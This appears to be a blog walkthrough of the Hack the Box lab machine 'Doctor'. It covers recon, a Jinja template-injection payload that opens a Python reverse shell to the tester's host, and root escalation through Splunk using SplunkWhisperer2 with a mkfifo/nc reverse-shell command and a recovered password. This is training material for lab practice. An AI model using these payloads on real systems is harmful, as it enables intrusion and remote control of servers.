+++
author = "Nick"
categories = ["hack the box", "easy", "Linux", "splunk", "reverse shell", "Server Side Template Injection"]
date = 2021-05-01T17:02:00Z
description = ""
draft = false
thumbnail = "/images/2020/11/doctor.png"
slug = "hack-the-box-doctor"
tags = ["hack the box", "easy", "Linux", "splunk", "reverse shell", "Server Side Template Injection"]
title = "Hack the Box - Doctor"

+++


Welcome back! Today we are doing the Hack the Box machine - Doctor. This machine is listed as an Easy Linux machine. Let's jump in!

At this point, you know how we kick it off. That's right, `nmap`.

Command:
`nmap -sC -sV -p- -oA allscan 10.10.10.209`

Here are our results:
```
Nmap scan report for 10.10.10.209
Host is up (0.045s latency).                                                                                                                                                                       
Not shown: 65532 filtered ports                                                                                                                                                                    
PORT     STATE SERVICE  VERSION                                                                                                                                                                    
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)                                                                                                               
| ssh-hostkey:                                                                                                                                                                                     
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)                                                                                                                                     
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)                                                                                                                                    
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)                                                                                                                                  
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                             
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                       
|_http-title: Doctor                                                                                                                                                                               
8089/tcp open  ssl/http Splunkd httpd                                                                                                                                                              
| http-robots.txt: 1 disallowed entry                                                                                                                                                              
|_/                                                                                                                                                                                                
|_http-server-header: Splunkd                                                                                                                                                                      
|_http-title: splunkd                                                                                                                                                                              
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser                                                                                                                
| Not valid before: 2020-09-06T15:57:27                                                                                                                                                            
|_Not valid after:  2023-09-06T15:57:27                                                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                            
                                                                                                                                                                                                   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                     
Nmap done: 1 IP address (1 host up) scanned in 150.43 seconds  
```

So not much to see. We have a required key SSH option, a site being hosted  on 80 and potentiall 8089. It would seem that a path forward could be through `Splunk`. Awesome! As someone that uses Splunk on the daily, this should be fun.

When we visit the site being hosted, we are greated with a site dedicated to doctors. We see a site listed as doctors.htb, so we'll add that to our hosts lists. This way we can fuzz additional subdomains.

Next we kick of a `gobuster` scan to see what we can find.

Command:
`gobuster dir -u doctors.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,php -t 40`

We get back some basic pages.

![](/images/2020/11/image-7.png)

Let's try to access some of these 'hidden' pages, like `archive` and `login`. Nothing is there. If we navigate to 'doctors.htb' we are prompted with a login page. Checking the source does show the `archives` page as well.

![](/images/2020/11/image-8.png)

We can test the login page for basic injections but doesn't seem to be anything there. We can register an account though. We create the account and are given 20 minutes of access. Once we get authenticated we have a very small interface to work with.

![](/images/2020/11/image-9.png)

We can create new messages it seems.

![](/images/2020/11/image-10.png)

It's possible this field has some injection options. If we submit an `<h1>` tag, we can see it does reflect the HTML code.

![](/images/2020/11/image-11.png)

What's interesting about this is that the messages we send are also posted over to `/archive` as well.

![](/images/2020/11/image-12.png)

As we do more recon about the site, we see that `wappalyzer` has the site framework as `python`. So there are a few scenarios here. This form could be `XSS` or it oculd be `Template Injection` vulnerable. My guess would be the latter. You can read more on `Template Injection` [here](https://portswigger.net/research/server-side-template-injection).

If we google Python Template engine, we see the first result is `jinja`. If we google jinja template injection we see a few options, a good resource being [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings

We can test against this use case by doing just what's listed:

![](/images/2020/11/image-13.png)

Sure enough, we do get the expected results!

![](src="__GHOST_URL__/content/images/2020/11/1.png" width="272" height="166")![](src="__GHOST_URL__/content/images/2020/11/12.png" width="293" height="96")

So now, how do we leverage this? We simply leverage the supplied [Remote Code statement](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)!

Since it is `python` based, we can actually modify this statement to supply a standard `python` remote shell.

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.169\",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

We also need to ensure our listener is running on port 9090.

Command:
`nc -lvnp 9090`

We submit the message, check the archive page and we get a shell!

![](/images/2020/11/image-15.png)

Now that we have a low level shell, we can enumerate and escalate. We'll copy over `linpeas` and see what show up.

Make sure you have a web server running in your peas location.

Command:
`python -m SimpleHTTPServer 80`

Then download `linpeas`.

Command:
`wget 10.10.14.169/linpeas.sh`

Change the file permissions.

Command:
`chmod +x linpeas.sh` 

Then run it.

There's a lot to sift through. We do however, find a password in an old backup file:

![](/images/2020/11/image-16.png)

We can a assume the user typed his password in the email field here. And given the lines below it, make the assumption that the user is shaun. We'll just switch to Shaun and see.

Command:
`su shaun`

![](/images/2020/11/image-17.png)

Now if we upgrade our shell and snag our `user.txt` flag. Once we have it, we can start enumerating again. We'll re-run `linpeas` and see what it can find. An item that semi-sticks out is that `root` is running the `splunkd` process.

![](/images/2020/11/image-18.png)

If you've spent anytime working with `Splunk` you know this is a potentially bad scenario. Items like [SplunkWhisperer2](https://github.com/DaniloCaruso/SplunkWhisperer2) can make for a really bad day.

We'll clone the repo.

Command:
`git clone https://github.com/DaniloCaruso/SplunkWhisperer2`

Now we can use this to escalate our privileges. Simply supply the right commands to get a shell back or even just snag our flag file.

Command:
`python PySplunkWhisperer2_remote.py --lhost 10.10.14.169 --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "rm /tmp/zzz;mkfifo /tmp/zzz;cat /tmp/zzz|/bin/sh -i 2>&1|nc 10.10.14.169 6666 >/tmp/zzz"'`

![](/images/2020/11/image-19.png)

We  get a shell back as root! We get our flag and the box is done!



